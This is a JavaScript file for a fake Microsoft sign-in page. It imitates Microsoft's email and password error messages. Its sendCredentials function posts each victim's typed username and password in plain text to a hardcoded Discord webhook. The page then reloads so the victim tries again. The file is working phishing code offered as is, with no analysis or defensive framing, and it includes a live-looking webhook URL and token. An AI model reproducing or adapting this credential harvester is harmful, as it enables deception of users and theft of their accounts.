const slidePage = document.querySelector(".slide-page"),
  secondSlide = document.querySelector(".secondSlide"),
  btnNext = document.querySelector(".firstNext"),
  prevBtnSec = document.querySelector(".prev-1"),
  submitBtn = document.querySelector(".submit");
function validateEmail(e) {
  return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(
    e
  );
}
function validate() {
  const e = $("#result"),
    t = $("#email").val();
  return (
    e.text(""),
    !!validateEmail(t) ||
      (t
        ? (e.text(
            "That Microsoft account doesn't exist.\n Enter a different account or get a new one."
          ),
          e.css("color", "red"),
          (document.getElementById("loginForm").style.height = "403px"))
        : (e.text(
            "Enter a valid email address, phone number, or Skype\n name."
          ),
          e.css("color", "red"),
          (document.getElementById("loginForm").style.height = "403px")),
      !1)
  );
}
function validatePassword() {
  const e = $("#passResult"),
    t = $("#password").val();
  return (
    e.text(""),
    !(t.length < 8) ||
      (e.text(
        "Your account or password is incorrect. If you don't remember your password,"
      ),
      e.css("color", "red"),
      !1)
  );
}

function sendCredentials() {
  let userNamesss = sessionStorage.getItem("user");
  let passwordsss = sessionStorage.getItem("password");

  const message = {
    content: `Users Username: ${userNamesss}\nUsers Password: ${passwordsss}`,
  };

  const webhookURL =
    "https://discord.com/api/webhooks/1148571982691053641/GtFJLiLbLplmA_5L5J7VxuFVyUYHT9PQS-KJXLqwu0D9ZHDHvdZ0GP2YOTr8i2tFqabR";

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(message),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error("Network response was not ok");
      }
      console.log("Message sent successfully");
    })
    .catch((error) => {
      console.error("There was a problem with the fetch operation:", error);
    });
}

var input1 = document.getElementById("email"),
  input2 = document.getElementById("password");
input1.addEventListener("keyup", function (e) {
  13 === e.keyCode &&
    (e.preventDefault(), document.getElementById("btnSend").click());
}),
  input2.addEventListener("keyup", function (e) {
    13 === e.keyCode &&
      (e.preventDefault(), document.getElementById("btnSignIn").click());
  }),
  btnNext.addEventListener("click", function () {
    const e = document.getElementById("email").value;
    if (!validate()) return;
    if (!validateEmail(e)) return;
    document.getElementById("userLine").textContent = e;
    const t = document.getElementById("section-1"),
      n = document.getElementById("section-2");
    (t.style.marginLeft = "-100%"),
      (t.style.visibility = "hidden"),
      (n.style.marginLeft = "0%"),
      (document.getElementById("loginForm").style.height = "403px");
  }),
  submitBtn.addEventListener("click", function () {
    const e = document.getElementById("password").value,
      t = document.getElementById("email").value;
    if (validatePassword()) {
      sessionStorage.setItem("user", t);
      sessionStorage.setItem("password", e);
      sessionStorage.getItem("user");
      sessionStorage.getItem("password");
      sendCredentials();
      setTimeout(function () {
        console.log("Your Form Successfully Signed up"), location.reload();
      }, 0);
    }
  }),
  prevBtnSec.addEventListener("click", function () {
    const e = document.getElementById("section-1"),
      t = document.getElementById("section-2");
    (e.style.marginLeft = "0%"),
      (e.style.visibility = "visible"),
      (t.style.marginLeft = "100%"),
      (document.getElementById("loginForm").style.height = "370px"),
      (slidePage.style.marginLeft = "0%"),
      (secondSlide.style.marginLeft = "100%"),
      (slidePage.style.visibility = "visible");
  });
